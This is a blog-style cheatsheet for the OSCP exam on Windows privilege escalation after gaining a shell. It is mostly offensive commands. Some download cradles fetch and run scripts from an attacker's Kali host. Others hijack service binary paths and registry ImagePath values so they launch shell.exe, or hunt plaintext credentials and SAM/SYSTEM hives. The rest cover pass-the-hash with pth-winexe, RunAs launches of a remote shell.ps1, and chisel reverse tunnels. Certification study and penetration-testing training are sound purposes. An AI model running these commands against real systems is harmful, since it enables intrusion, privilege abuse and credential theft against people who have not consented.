---
title: Windows Privilege Escalation
date: 2020-06-26 18:05:42
tags: [oscp, cheatsheet, windows, privilege escalation]
---

# Windows Privilege Escalation Cheatsheet

So you got a shell, what *now*?
This post will help you with local enumeration as well as escalate your privileges further.

Usage of different enumeration scripts and tools is encouraged, my favourite is [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). If confused which executable to use, use [this](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe)

Keep in mind:
* To exploit services or registry, you require:
    * appropriate write permissions
    * service start permission
    * service stop permission
* Look for non-standard programs on the system

*Note: This is a live document. I'll be adding more content as I learn more*

## Binaries
Get 64-bit netcat from [here](https://eternallybored.org/misc/netcat/)
Get Chisel from [here](https://github.com/jpillora/chisel/releases) 

## General Information
``` powershell
# If nothing is specified, assume command can be run on cmd.exe or powershell.exe
whoami
echo %username%
whoami /all

hostname
echo %hostname%

net users
net users username

# Note hostname, patches, architecture
systeminfo

# Both should be the same for ease of exploitation
# PowerShell
# Make a 64-bit shell using nc64.exe
[environment]::Is64BitOperatingSystem
[environment]::Is64BitProcess

# Check LanguageMode (FullLanguage is nicer to have)
$ExecutionContext.SessionState.LanguageMode

# Check AppLocker policy
Get-AppLockerPolicy -Effective
# View RuleCollections in detail
Get-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections

# all, addresses:port, PID
netstat -ano
```
## File Transfer
``` powershell
# On KALI
# use double-quotes if file path has spaces in it 
sudo impacket-smbserver abcd /path/to/serve

# mount drives
net use abcd: \\kali_ip\myshare
net use abcd: /d # disconnect
net use abcd: /delete # then delete
# PowerShell
New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
Remove-PSDrive -Name abcd

# OR copy directly from the share without mounting
copy //kali_ip/abcd/file_name C:\path\to\save
copy C:\path\to\file //kali_ip/abcd
copy "C:\Program Files\..\legit.exe" C:\Temp
copy /Y C:\Downloads\shell.exe "C:\Program Files\...\legit.exe"

# Download to Windows
# Load script in memory
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
powershell.exe iex (iwr http://ip/file -usebasicparsing)

# Save script on disk
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
certutil -urlcache -f http://kali_ip/file file
```
## Automated Enumeration
``` powershell
# Run winPEAS
# For color: 
	# > REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
	# > cmd.exe
.\winpeasany.exe quiet
```
## Accesschk

``` powershell
# .\accesschk.exe /accepteula
# -c : Name a windows service, or use * for all
# -d : Only process directories
# -k : Name a registry key e.g., hklm/software
# -q : Omit banner
# -s : Recurse
# -u : Suppress errors
# -v : Verbose
# -w : Show objects with write access

# Check service permissions
# ALWAYS RUN THE FOLLOWING TO CHECK IF YOU'VE PERMISSIONS TO START AND STOP THE SERVICE
.\accesschk.exe /accepteula -ucqv <user> <svc_name>

# Get all writable services as per groups
.\accesschk.exe /accepteual -uwcqv Users *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Is dir writable? - Unquoted service paths
.\accesschk.exe /accepteula -uwdv "C:\Program Files"

# User permissions on an executable
.\accesschk.exe /accepteula -uqv "C:\Program Files\...\file.exe"

# Find all weak permissions - folders
.\accesschk.exe /accepteula -uwdqs Users c:\
.\accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Find all weak permissions - files
.\accesschk.exe /accepteula -uwqs Users c:\*.*
.\accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*

# Registry ACL - Weak registry permissions
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\svc_name
# PowerShell
Get-Acl HKLM\System\CurrentControlSet\Services\svc_name | Format-List

# Get rights of any file, or folder
# PowerShell
(get-acl C:\path\to\file).access | ft IdentityReference,FileSystemRights,AccessControlType
```
## sc.exe
``` powershell
# Query service configuration
# Verify after doing all the changes
sc qc svc

# Current state of the service
sc query svc

# Modify config
sc config svc binpath= "\"C:\Downloads\shell.exe\""

# if dependencies exist
sc config depend_svc start= auto
net start depend_svc
net start svc

# can instead remove dependency too
sc config svc depend= ""

# Start/stop the service
net start/stop svc
```
## Registry 
``` powershell
# Query configuration of registry entry of the service
reg query HKLM\System\CurrentControlSet\Services\svc_name

# Point the ImagePath to malicious executable
reg add HKLM\SYSTEM\CurrentControlSet\services\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\path\shell.exe /f

# Start/stop the service to get the shell
net start/stop svc

# Execute a reverse_shell.msi as admin
# Manually, both query's output should be 0x1 to exploit
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
## Credentials or Hashes
``` powershell
# Common creds location, always in plaintext
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogin"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# If found, prints the location of the file
dir /s <filename> # or extensions
dir /s SAM
dir /s SYSTEM
dir /s Unattend.xml

# Found creds?
# On KALI
# --system only works if admin creds are on hand
winexe -U 'admin%pass123' [--system] //10.10.10.10 cmd.exe
# Found hash?
pth-winexe -U 'domain\admin%LM:NTLM' [--system] //10.10.10.10 cmd.exe
```
## RunAs
``` powershell
# cmd
runas /savecred /user:admin C:\abcd\reverse.exe

# PowerShell Runas 1
$password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')" -Credential $cred

# PowerShell Runas 2
$username = "domain\Administrator"
$password = "pass123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
```

## Find Files Fast
``` powershell
dir /s <filename> # or extensions
Get-ChildItem -Path C:\ -Include *filename_wildcard* -Recurse -ErrorAction SilentlyContinue
```

## Port Forwarding 
``` powershell
# If some port are listening on the target machine but inaccessible, forward the ports - Port Forwarding
# winexe, pth-winexe, smbexec.py, psexec works on 445, MySQL on 3306
# On KALI
./chisel server --reverse --port 9001
# On Windows
.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
# Example --> .\chisel.exe client KALI_IP:9001 R:445:127.0.0.1:445

# On KALI
winexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT
smbexec.py domain/username:password@127.0.0.1 
mysql --host=127.0.0.1 --port=KALI_PORT -u username -p
```
## Exploit suggester
Windows exploit suggester can be found [here](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
``` powershell
# On KALI
# Find exploits
# .\windows-exploit-suggester.py --update
.\windows-exploit-suggester.py -i systeminfo.txt -d 2020-xxx.xlsx
```